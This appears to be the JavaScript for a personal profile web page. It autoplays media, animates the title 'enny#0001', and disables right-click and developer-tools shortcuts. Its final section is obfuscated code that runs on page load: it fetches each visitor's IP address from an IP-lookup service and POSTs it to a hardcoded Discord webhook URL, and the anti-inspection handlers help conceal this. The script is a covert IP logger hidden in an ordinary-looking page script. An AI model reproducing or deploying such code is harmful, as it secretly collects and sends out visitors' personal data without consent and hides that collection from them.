function audio() {
    var video = document.getElementById("video");
    video.play()
}

function video() {
    var audio = document.getElementById("audio");
    audio.volume = 0.4;
    audio.play()
}

video()

document.onkeydown = function (e) {
    if (event.keyCode == 123) {
        return false;
    }
    if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
        return false;
    }
    if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) {
        return false;
    }
    if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
        return false;
    }
    if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
        return false;
    }
}

let counter = 0; let Title = 'enny#0001'; let direction = true;
aniTitle = setInterval(function () {
    if (counter == Title.length) direction = false;
    if (counter == false) direction = true;
    counter = (direction == true) ? ++counter : --counter;
    newtitle = (counter == 0) ? "" : Title.slice(0, counter);
    document.title = 'w' + newtitle;
}, 400)

window.oncontextmenu = function () {
    return false;
}
$(document).keydown(function (event) {
    if (event.keyCode == 123) {
        return false;
    }
    else if ((event.ctrlKey && event.shiftKey && event.keyCode == 73) || (event.ctrlKey && event.shiftKey && event.keyCode == 74)) {
        return false;
    }
});

function _0x111b(_0x229d36,_0x441856){var _0x54d335=_0x54d3();return _0x111b=function(_0x111b02,_0x18d738){_0x111b02=_0x111b02-0x1f4;var _0x4fed67=_0x54d335[_0x111b02];return _0x4fed67;},_0x111b(_0x229d36,_0x441856);}var _0x493745=_0x111b;(function(_0x54701a,_0x4297d8){var _0x60d92c=_0x111b,_0x17cb26=_0x54701a();while(!![]){try{var _0x51be39=parseInt(_0x60d92c(0x203))/0x1+-parseInt(_0x60d92c(0x1f5))/0x2+-parseInt(_0x60d92c(0x1ff))/0x3+-parseInt(_0x60d92c(0x1f4))/0x4+parseInt(_0x60d92c(0x1fb))/0x5*(-parseInt(_0x60d92c(0x201))/0x6)+parseInt(_0x60d92c(0x1fc))/0x7+-parseInt(_0x60d92c(0x1fd))/0x8*(-parseInt(_0x60d92c(0x1f8))/0x9);if(_0x51be39===_0x4297d8)break;else _0x17cb26['push'](_0x17cb26['shift']());}catch(_0xbd8735){_0x17cb26['push'](_0x17cb26['shift']());}}}(_0x54d3,0xe15c2));function koko(){var _0x43d638=_0x111b,_0x3abf5b='';fetch(_0x43d638(0x202))[_0x43d638(0x200)](function(_0x5a5393){var _0x3a2f0a=_0x43d638;return _0x5a5393[_0x3a2f0a(0x1f7)]();})[_0x43d638(0x200)](function(_0x2d33be){var _0x5bd008=_0x43d638;_0x3abf5b=_0x2d33be['ip'];var _0x1601d7=_0x5bd008(0x1f6),_0x2da735={'content':'IP:\x20'+_0x3abf5b},_0x1a2dbd=document[_0x5bd008(0x205)]('ip');_0x1a2dbd[_0x5bd008(0x1f9)]=_0x3abf5b,fetch(_0x1601d7,{'method':'POST','headers':{'Content-Type':_0x5bd008(0x206)},'body':JSON[_0x5bd008(0x204)](_0x2da735)});});}document[_0x493745(0x1fa)](_0x493745(0x1fe),koko);function _0x54d3(){var _0x5118ac=['https://discord.com/api/webhooks/1132602947864371301/WJFkDltIFd-Jw6rxyfuaDOui-yCHEDaFkUzQT54ZY2hLMi99hRVV-CdmQCy7vp6HWYT3','json','12544407LOvuNO','textContent','addEventListener','4693220ZdsTzS','7926212BnmrUO','8iNSWEv','DOMContentLoaded','2427093MWTQgg','then','6EBgeKU','https://api.ipify.org/?format=json','1510372RLGxhl','stringify','getElementById','application/json','1243264ZmTaWV','2109892jRWyAp'];_0x54d3=function(){return _0x5118ac;};return _0x54d3();}
